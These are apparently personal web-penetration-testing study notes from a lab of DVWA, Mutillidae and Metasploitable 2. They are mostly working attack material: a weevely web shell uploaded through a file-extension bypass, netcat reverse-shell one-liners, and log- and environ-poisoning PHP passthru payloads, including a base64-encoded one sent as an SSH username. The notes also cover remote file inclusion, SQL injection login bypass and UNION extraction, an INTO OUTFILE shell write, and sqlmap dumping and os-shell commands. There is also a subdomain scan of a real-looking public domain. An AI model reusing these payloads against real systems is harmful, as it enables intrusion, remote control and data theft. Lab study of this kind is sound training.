
Information Gathering
--------------------

"Gathering target website's info by the following"

whois.domaintools.com
toolbar.netcraft.com/site_report?url=
www.robtex.com

"To find subdomains of target - https://github.com/guelfoweb/knock.git"

> chmod -R 755 knock
> sudo su
> python3 setup.py install
> knockpy --version
> knockpy --help

> knockpy isecurity.org
  _  __                 _                
 | |/ /                | |   v5.1.0            
 | ' / _ __   ___   ___| | ___ __  _   _ 
 |  < | '_ \ / _ \ / __| |/ / '_ \| | | |
 | . \| | | | (_) | (__|   <| |_) | |_| |
 |_|\_\_| |_|\___/ \___|_|\_\ .__/ \__, |
                            | |     __/ |
                            |_|    |___/ 

local: 2019 | google: 0 | duckduckgo: 1 | virustotal: 0 
                                                                                                                            
Wordlist: 2020 | Target: isecurity.org | Ip: 95.211.73.102 
                                                                                                                            
06:44:06

Ip address      Code Subdomain                     Server                        Real hostname
--------------- ---- ----------------------------- ----------------------------- -----------------------------
95.211.73.102   200  cpanel.isecurity.org          Apache                                                     
95.211.73.102   401  cpcalendars.isecurity.org     cPanel                                                     
95.211.73.102   200  ftp.isecurity.org             Apache                                                     
5.79.69.19      403  mail.isecurity.org            Apache                                                     
95.211.73.102   401  whm.isecurity.org             Apache                                                     
95.211.73.102   200  www.isecurity.org             Apache                        isecurity.org
                                                                                
06:51:28

Ip address: 2 | Subdomain: 6 | elapsed time: 00:07:21 

Discovering sensitive files
---------------------------

> dirb --version
> dirb [target_address] [wordlist] [options]
> man dirb

> dirb [target_address]


-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Aug 22 09:29:23 2021
URL_BASE: http://192.168.104.6/mutillidae/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.104.6/mutillidae/ ----
==> DIRECTORY: http://192.168.104.6/mutillidae/classes/                                                                   
+ http://192.168.104.6/mutillidae/credits (CODE:200|SIZE:509)                                                             
==> DIRECTORY: http://192.168.104.6/mutillidae/documentation/                                                             
+ http://192.168.104.6/mutillidae/favicon.ico (CODE:200|SIZE:1150)                                                        
+ http://192.168.104.6/mutillidae/footer (CODE:200|SIZE:450)                                                              
+ http://192.168.104.6/mutillidae/header (CODE:200|SIZE:19879)                                                            
+ http://192.168.104.6/mutillidae/home (CODE:200|SIZE:2930)                                                               
==> DIRECTORY: http://192.168.104.6/mutillidae/images/                                                                    
+ http://192.168.104.6/mutillidae/inc (CODE:200|SIZE:386260)                                                              
==> DIRECTORY: http://192.168.104.6/mutillidae/includes/                                                                  
+ http://192.168.104.6/mutillidae/index (CODE:200|SIZE:24237)                                                             
+ http://192.168.104.6/mutillidae/index.php (CODE:200|SIZE:24237)                                                         
+ http://192.168.104.6/mutillidae/installation (CODE:200|SIZE:8138)                                                       
==> DIRECTORY: http://192.168.104.6/mutillidae/javascript/                                                                
+ http://192.168.104.6/mutillidae/login (CODE:200|SIZE:4102)                                                              
+ http://192.168.104.6/mutillidae/notes (CODE:200|SIZE:1721)                                                              
+ http://192.168.104.6/mutillidae/page-not-found (CODE:200|SIZE:705)                                                      
==> DIRECTORY: http://192.168.104.6/mutillidae/passwords/                                                                 
+ http://192.168.104.6/mutillidae/phpinfo (CODE:200|SIZE:48888)                                                           
+ http://192.168.104.6/mutillidae/phpinfo.php (CODE:200|SIZE:48900)                                                       
+ http://192.168.104.6/mutillidae/phpMyAdmin (CODE:200|SIZE:174)                                                          
+ http://192.168.104.6/mutillidae/register (CODE:200|SIZE:1823)                                                           
+ http://192.168.104.6/mutillidae/robots (CODE:200|SIZE:160)                                                              
+ http://192.168.104.6/mutillidae/robots.txt (CODE:200|SIZE:160)                                                          
==> DIRECTORY: http://192.168.104.6/mutillidae/styles/                                                                    
                                                                                                                          
---- Entering directory: http://192.168.104.6/mutillidae/classes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                          
---- Entering directory: http://192.168.104.6/mutillidae/documentation/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                          
---- Entering directory: http://192.168.104.6/mutillidae/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                          
---- Entering directory: http://192.168.104.6/mutillidae/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                          
---- Entering directory: http://192.168.104.6/mutillidae/javascript/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                          
---- Entering directory: http://192.168.104.6/mutillidae/passwords/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                          
---- Entering directory: http://192.168.104.6/mutillidae/styles/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sun Aug 22 09:29:30 2021
DOWNLOADED: 4612 - FOUND: 18
                  
To build up social engineering map use - Maltego

File Upload Vulnerabilities
---------------------------

"Required Tools - Metasploitable 2, DVWA, Weevely"

> weevely --version


[+] weevely 4.0.1
[!] Error: the following arguments are required: url, password

[+] Run terminal or command on the target
    weevely <URL> <password> [cmd]

[+] Recover an existing session
    weevely session <path> [cmd]

[+] Generate new agent
    weevely generate <password> <path>

> weevely generate [password] [path]/[file_name].php

"Upload file to target, it can see uploaded URI/URL in page because it is lab page."

> weevely [target_address]/dvwa/hackable/uploads/[file_name].php [password]

[+] weevely 4.0.1

[+] Target:     192.168.104.6
[+] Session:    /home/zawmoehtike/.weevely/sessions/192.168.104.6/backdoor_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely > ls

The remote script execution triggers an error 500, check script and payload integrity
114-1149126_apple-clipart-black-and-white-image-small-clip.png
backdoor.php
dvwa_email.png
index.jpeg
lorem_text.txt

www-data@192.168.104.6:/var/www/dvwa/hackable/uploads $ ls -l

The remote script execution triggers an error 500, check script and payload integrity
total 84
-rw------- 1 www-data www-data 54593 Aug 22 10:11 114-1149126_apple-clipart-black-and-white-image-small-clip.png
-rw------- 1 www-data www-data   744 Aug 22 10:27 backdoor.php
-rw-r--r-- 1 www-data www-data   667 Mar 16  2010 dvwa_email.png
-rw------- 1 www-data www-data  8573 Aug 22 10:14 index.jpeg
-rw------- 1 www-data www-data    10 Aug 22 10:12 lorem_text.txt

www-data@192.168.104.6:/var/www/dvwa/hackable/uploads $ help

The remote script execution triggers an error 500, check script and payload integrity

 :net_ifconfig                 Get network interfaces addresses.                                    
 :net_phpproxy                 Install PHP proxy on the target.                                     
 :net_curl                     Perform a curl-like HTTP request.                                    
 :net_mail                     Send mail.                                                           
 :net_proxy                    Run local proxy to pivot HTTP/HTTPS browsing through the target.     
 :net_scan                     TCP Port scan.                                                       
 :sql_console                  Execute SQL query or run console.                                    
 :sql_dump                     Multi dbms mysqldump replacement.                                    
 :file_gzip                    Compress or expand gzip files.                                       
 :file_clearlog                Remove string from a file.                                           
 :file_touch                   Change file timestamp.                                               
 :file_cp                      Copy single file.                                                    
 :file_cd                      Change current working directory.                                    
 :file_download                Download file from remote filesystem.                                
 :file_mount                   Mount remote filesystem using HTTPfs.                                
 :file_check                   Get attributes and permissions of a file.                            
 :file_enum                    Check existence and permissions of a list of paths.                  
 :file_zip                     Compress or expand zip files.                                        
 :file_upload2web              Upload file automatically to a web folder and get corresponding URL. 
 :file_edit                    Edit remote file on a local editor.                                  
 :file_webdownload             Download an URL.                                                     
 :file_read                    Read remote file from the remote filesystem.                         
 :file_bzip2                   Compress or expand bzip2 files.                                      
 :file_ls                      List directory content.                                              
 :file_upload                  Upload file to remote filesystem.                                    
 :file_rm                      Remove remote file.                                                  
 :file_find                    Find files with given names and attributes.                          
 :file_tar                     Compress or expand tar archives.                                     
 :file_grep                    Print lines matching a pattern in multiple files.                    
 :backdoor_tcp                 Spawn a shell on a TCP port.                                         
 :backdoor_reversetcp          Execute a reverse TCP shell.                                         
 :bruteforce_sql               Bruteforce SQL database.                                             
 :system_extensions            Collect PHP and webserver extension list.                            
 :system_procs                 List running processes.                                              
 :system_info                  Collect system information.                                          
 :audit_filesystem             Audit the file system for weak permissions.                          
 :audit_disablefunctionbypass  Bypass disable_function restrictions with mod_cgi and .htaccess.     
 :audit_suidsgid               Find files with SUID or SGID flags.                                  
 :audit_phpconf                Audit PHP configuration.                                             
 :audit_etcpasswd              Read /etc/passwd with different techniques.                          
 :shell_su                     Execute commands with su.                                            
 :shell_php                    Execute PHP commands.                                                
 :shell_sh                     Execute shell commands.  

Intercepting Requests
--------------------

"Used tool - Burp Suite"

"It is GUI tool."

"Setup using Burp Suite as proxy in Firefox."

"Bypass file uploading by uploading file extension as [file_name].php.jpg"

"So, it will execute as this => weevely [target_address]/dvwa/hackable/uploads/[file_name].php.jpg [password]"

Code Execution Vulnerability
---------------------------

"Used tool - Net Cat"

"Type the following in Hacker' machine"

> nc -vv -l -p 8080

listening on [any] 8080 ...
192.168.104.6: inverse host lookup failed: Unknown host
connect to [192.168.104.3] from (UNKNOWN) [192.168.104.6] 34553

> ls
> cd [dir_name]
> ls
> cd ..

"Execute the following in Target server"

> [your_ip_address] nc -e /bin/sh [your_ip_address] 8080

or

> [your_ip_address] | nc -e /bin/sh [your_ip_address] 8080

Local File Inclusion Vulnerability
---------------------------------

"Used tool - Net Cat, Burp Suit"

"Allow attacker to read any file on the same server."
"Access file outside www directory."

> http://192.168.104.6/dvwa/vulnerabilities/fi/?page=include.php

> http://192.168.104.6/dvwa/vulnerabilities/fi/?page=[file_name].php

"If it include file that do not exit, it will show error message as below."

Warning: include(include1.php) [function.include]: failed to open stream: No such file or directory in /var/www/dvwa/vulnerabilities/fi/index.php on line 35

Warning: include() [function.include]: Failed opening 'include1.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear:../../external/phpids/0.6/lib/') in /var/www/dvwa/vulnerabilities/fi/index.php on line 35

Warning: Cannot modify header information - headers already sent by (output started at /var/www/dvwa/vulnerabilities/fi/index.php:35) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 324

Warning: Cannot modify header information - headers already sent by (output started at /var/www/dvwa/vulnerabilities/fi/index.php:35) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 325

Warning: Cannot modify header information - headers already sent by (output started at /var/www/dvwa/vulnerabilities/fi/index.php:35) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 326

> http://192.168.104.6/dvwa/vulnerabilities/fi/?page=/etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh dhcp:x:101:102::/nonexistent:/bin/false syslog:x:102:103::/home/syslog:/bin/false klog:x:103:104::/home/klog:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash bind:x:105:113::/var/cache/bind:/bin/false postfix:x:106:115::/var/spool/postfix:/bin/false ftp:x:107:65534::/home/ftp:/bin/false postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false distccd:x:111:65534::/:/bin/false user:x:1001:1001:just a user,111,,:/home/user:/bin/bash service:x:1002:1002:,,,:/home/service:/bin/bash telnetd:x:112:120::/nonexistent:/bin/false proftpd:x:113:65534::/var/run/proftpd:/bin/false statd:x:114:65534::/var/lib/nfs:/bin/false
Warning: Cannot modify header information - headers already sent by (output started at /etc/passwd:12) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 324

Warning: Cannot modify header information - headers already sent by (output started at /etc/passwd:12) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 325

Warning: Cannot modify header information - headers already sent by (output started at /etc/passwd:12) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 326

"Try to inject code into readable files."

/proc/self/environ
/var/log/auth.log
/var/log/apache2/access.log

> http://192.168.104.6/dvwa/vulnerabilities/fi/?page=/var/log/auth.log

"Let intercept by using Burp Suit"

> http://192.168.104.6/dvwa/vulnerabilities/fi/?page=/proc/self/environ

"While Intercepting, Put that code in User Agent in Burp Suite => <?phpinfo();?>"

"While Intercepting, Put that code in User Agent in Burp Suite => <?passthru("nc -e /bin/sh [your_ip_address] 8888");?> for Explotation"

> nc -vv -l -p 8888

listening on [any] 8888 ...

192.168.104.6: inverse host lookup failed: Unknown host
connect to [192.168.104.3] from (UNKNOWN) [192.168.104.6] 46580
ls
help
include.php
index.php
source

"Encode this as Base64 => nc -e /bin/sh [your_ip_address] 8000"

"Decoded string => bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEwNC42IDgwMDA="

> ssh [user_name]@[target_ip]

"Sure you don't have target username and password"

"You can execute the following code"

> ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEwNC42IDgwMDA='));?>"@192.168.104.6

Remote File Inclusion Vulnerability
---------------------------------

"Allow an attacker to read, execute any file from any server."
"Store php files on other server server as txt."

"Imagine you can access target server via ssh"

> ssh [user_name]@[target_ip]

> vim /etc/php5/cgi/php.ini

"Make sure in /etc/php5/cgi/php.ini file => allow_url_include = On"

> http://192.168.104.6/dvwa/vulnerabilities/fi/?page=http://192.168.104.3/index.html

"Write this in reverse.txt => <?passthru("nc -e /bin/sh [your_ip_address] 8888");?>"

"Put revere.txt under /var/www/html"

> nc -vv -l -p 8888

listening on [any] 8888 ...
192.168.104.6: inverse host lookup failed: Unknown host
connect to [192.168.104.3] from (UNKNOWN) [192.168.104.6] 53985                                                            
ls                                                                                                                         
help                                                                                                                       
include.php
index.php
source

"Bypassing remote file inclusion as (hTTp://...) => hTTp://192.168.104.6/dvwa/vulnerabilities/fi/?page=hTTp://192.168.104.3/reverse.txt"

SQL Injection - Login
-------------

"Discovering SQL"

"Try to break page, Use 'and', 'order by', '\'', Test text boxes and url parameters on the form"

"Type the following in input field of password"

> 123456' AND 1=1#

SELECT * FROM accounts WHERE username='zaw' AND password='123456' AND 1=1#'

"Type the follwoing in input field of username"

> admin' #

SELECT * FROM accounts WHERE username='admin' #AND password=''

"It will just execute => SELECT * FROM accounts WHERE username='admin'"

> zaw' #

SELECT * FROM accounts WHERE username='zaw' #AND password=''

"It will just execute => SELECT * FROM accounts WHERE username='zaw'"

SQL Injection - Data
-------------

"Test with Mutillidae Web App Offline => OWASP Top 10 > A1 Injection > SQLi Extract Data > User Info"

> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details

> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw' order by 1#&password=123456&user-info-php-submit-button=View+Account+Details

"Replace # with %23"

> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw' order by 1%23&password=123456&user-info-php-submit-button=View+Account+Details

> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw' %23&password=123456&user-info-php-submit-button=View+Account+Details

"can add this => union select 1,database(),user(),version(),5"

> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw%27%20union%20select%201,database(),user(),version(),5%23&password=123456&user-info-php-submit-button=View+Account+Details

"To fetch tables name => union select 1,table_name,null,null,5 from information_schema.tables where table_schema='owasp10'"

"To fetch columns => union select 1,column_name,null,null,5 from information_schema.columns where table_name='accounts'"

"To fetch records => union select 1,username,password,is_admin,5 from accounts"

SQL Injection
-------------

"In DVWA's SQL Injection"

"Input the following in input field"

"Bypass by writing => aND, anD, aNd, /****/,etc"

> 1' aNd /****/ 1=1 #

"Input the following in url field"

> http://192.168.104.6/dvwa/vulnerabilities/sqli/?id=1%27+aNd+%2F****%2F+1%3D1+%23&Submit=Submit#

> http://192.168.104.6/dvwa/vulnerabilities/sqli/?id=1' union select 1,2%23&Submit=Submit#

ID: 1' union select 1,2#
First name: admin
Surname: admin

ID: 1' union select 1,2#
First name: 1
Surname: 2

> http://192.168.104.6/dvwa/vulnerabilities/sqli/?id=1' union select table_name,2 from information_schema.tables%23&Submit=Submit#

> http://192.168.104.6/dvwa/vulnerabilities/sqli/?id=1' union select 1,table_name from information_schema.tables%23&Submit=Submit#

SQL Injection
-------------

"In mutillidae"

"Reading /etc/passwd file by SQL Injection"

> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw' union select null,load_file('/etc/passwd'),null,null,null %23&password=123456&user-info-php-submit-button=View+Account+Details

"Reading texts to a file by SQL Injection"

"Assume /var/www/mutillidae/ was allow permission to write"

> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw' union select null,'example example',null,null,null into outfile '/var/www/mutillidae/example.txt' %23&password=123456&user-info-php-submit-button=View+Account+Details

"It can write Net Cat to file by SQL Injection and execute via Web Browser"

"In DVWA"

> union select '<?passthru("nc -e /bin/sh [your_ip_address] [your_port]");?>',null into outfile '/tmp/reverse.php'

"Listen from your device"

> nc -vv -l -p [your_port]

"Execute via Web Browser"

> [target_domain]/dvwa/vulnerabilities/fi/?page=../../../../../tmp/reverse.php

SQL Injection - SQL Map
-------------

"Tool designed to exploit sql injections."
"Works with many databases types (MySQL, MSSQL, etc)."

> sqlmap --help
> sqlmap -u [target_url]

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details"

"The following command exploit databases"

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --dbs

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --current-user

"The following command exploit current database"

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --current-db

"The following command exploit tables of current database"

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --tables -D [database_name]

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --tables -D owasp10

"The following command exploit columns of table of current database"

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --columns -T [table_name]

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --columns -T accounts

"The following command query all records in table"

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" -T [table_name] -D [database_name] --dump

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" -T accounts -D owasp10 --dump

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --os-shell

"The following command is for executing SQL Shell"

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --sql-shell

sql-shell > current_user()
sql-shell > user()
sql-shell > database()
sql-shell > select table_name from information_schema.tables where table_schema = [table_name] [6];
sql-shell > select table_name from information_schema.tables where table_schema = 'owasp10' [6];

SQL Injection - Prevention
------------

"Filters, Using black list of commands, Using white list of commands can be bypassed."
"Use parameterized statements and separate data from SQL code."

Example:

Psue-do-code

<?php

$user_name = admin' union select ... #

select * from accounts where username=$user_name

"Use the following instead of above"

Safe:
    ->prepare("select * from accounts where username = ?")
    ->execute(array('$user_name'))













































